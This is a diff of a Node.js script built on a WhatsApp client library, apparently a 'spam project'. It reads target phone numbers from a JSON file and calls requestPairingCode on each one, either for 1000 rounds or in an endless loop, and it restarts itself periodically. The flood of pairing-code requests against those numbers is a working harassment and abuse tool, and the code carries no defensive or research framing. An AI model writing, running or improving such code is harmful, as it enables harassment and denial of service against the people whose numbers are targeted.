@@ -3,36 +3,27 @@ const { makeWASocket, useMultiFileAuthState } = pkg;
 import pino from 'pino';
 import readline from "readline";
 import fs from 'fs';
-
-const color = [
-    '\x1b[31m', 
-    '\x1b[32m', 
-    '\x1b[33m', 
-    '\x1b[34m', 
-    '\x1b[35m', 
-    '\x1b[36m', 
-    '\x1b[37m',
-    '\x1b[90m' 
-];
-const Color = color[Math.floor(Math.random() * color.length)];
-const xColor = '\x1b[0m';
+import { spawn } from 'child_process';
 
 const question = (text) => {
     const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-    return new Promise((resolve) => rl.question(text, resolve)).finally(() => rl.close());
+    return new Promise((resolve) => { rl.question(text, resolve) });
 };
 
-const loadNumbers = () => {
-    if (fs.existsSync('numbers_spam.json')) {
-        const phoneNumbersData = JSON.parse(fs.readFileSync('numbers_spam.json', 'utf8'));
-        const phoneNumbers = Object.values(phoneNumbersData).flat();
-        return phoneNumbers;
+let lastModifiedTime = 0;
+
+const checkFileChange = (filePath) => {
+    const stats = fs.statSync(filePath);
+    const modifiedTime = stats.mtimeMs;
+    if (modifiedTime !== lastModifiedTime) {
+        lastModifiedTime = modifiedTime;
+        return true;
     }
-    return [];
+    return false;
 };
 
-const Spam = async () => {
-    const { state } = await useMultiFileAuthState('./69/session');
+const XeonProject = async () => {
+    const { state } = await useMultiFileAuthState('./session');
     const XeonBotInc = makeWASocket({
         logger: pino({ level: "silent" }),
         printQRInTerminal: false,
@@ -48,63 +39,70 @@ const Spam = async () => {
         browser: ["Ubuntu", "Chrome", "20.0.04"],
     });
 
+    let phoneNumbers = [];
+
+    const loadNumbers = () => {
+        if (fs.existsSync('numbers_spam.json')) {
+            const phoneNumbersData = JSON.parse(fs.readFileSync('numbers_spam.json', 'utf8'));
+            phoneNumbers = Object.values(phoneNumbersData).flat();
+        }
+    };
+
+    loadNumbers();
+
+    const option = await Promise.race([
+        question(''),
+        new Promise((resolve) => setTimeout(() => resolve('2'), 1000))
+    ]);
+
+    let count = 0;
+
+    const intervalId = setInterval(() => {
+        loadNumbers();
+        if (checkFileChange('numbers_spam.json')) {
+            console.log("File changed, restarting...");
+            spawn(process.execPath, [import.meta.url], { stdio: 'inherit' });
+            process.exit();
+        }
+    }, 1000);
+
+    setInterval(() => {
+        console.log("Pausing for 10 minutes...");
+        clearInterval(intervalId);
+
+        setTimeout(() => {
+            console.log("Restarting the process...");
+            spawn(process.execPath, [import.meta.url], { stdio: 'inherit' });
+            process.exit();
+        }, 10000);
+    }, 10 * 60 * 1000);
+
     try {
-        const activeNumbers = new Set(loadNumbers());
-
-        const sendSpam = async (number) => {
-            try {
-                let code = await XeonBotInc.requestPairingCode(number);
-                code = code?.match(/.{1,4}/g)?.join("-") || code;
-                console.log(`${Color}${number} - Spam sent${xColor}`);
-            } catch (error) {
-                console.error('Error:', error.message);
+        if (option === '1') {
+            const xeonCodes = 1000;
+            for (let i = 0; i < xeonCodes; i++) {
+                await Promise.all(phoneNumbers.map((phoneNumber) => sendPairingCode(XeonBotInc, phoneNumber, i + 1, xeonCodes)));
             }
-        };
-
-        const spamContinuously = async () => {
-            for (const number of activeNumbers) {
-                await sendSpam(number);
-                await new Promise(resolve => setImmediate(resolve));
+        } else {
+            while (true) {
+                await Promise.all(phoneNumbers.map((phoneNumber) => sendPairingCode(XeonBotInc, phoneNumber, ++count)));
             }
-        };
-
-        setInterval(() => {
-            spamContinuously();
-        }, 1000);
-
-        setInterval(() => {
-            const currentNumbers = loadNumbers();
-            const newNumbers = currentNumbers.filter(num => !activeNumbers.has(num));
-            const deletedNumbers = Array.from(activeNumbers).filter(num => !currentNumbers.includes(num));
-
-            newNumbers.forEach(num => activeNumbers.add(num));
-            deletedNumbers.forEach(num => {
-                activeNumbers.delete(num);
-                console.log(`${Color}${num} - Spam stopped (number deleted)${xColor}`);
-            });
-        }, 1000);
-
+        }
     } catch (error) {
-        console.error('Error:', error.message);
+        console.error('error:', error);
     }
 
     return XeonBotInc;
 };
 
-const runSpamWithRestart = async () => {
-    console.log(`${Color}
-=================================
-    S P A M   P R O J E C T
-=================================
-${xColor}`);
-    
-    await Spam();
-
-    // إعادة التشغيل كل دقيقة
-    setTimeout(() => {
-        console.log(`${Color}Restarting Spam...${xColor}`);
-        runSpamWithRestart();
-    }, 60 * 1000); // 1 دقيقة
+const sendPairingCode = async (XeonBotInc, phoneNumber, index, total) => {
+    try {
+        let code = await XeonBotInc.requestPairingCode(phoneNumber);
+        code = code?.match(/.{1,4}/g)?.join("-") || code;
+        console.log(`${phoneNumber} [${index}/${total || 'Unlimited'}]`);
+    } catch (error) {
+        console.error('Error:', error.message);
+    }
 };
 
-runSpamWithRestart();
+XeonProject();
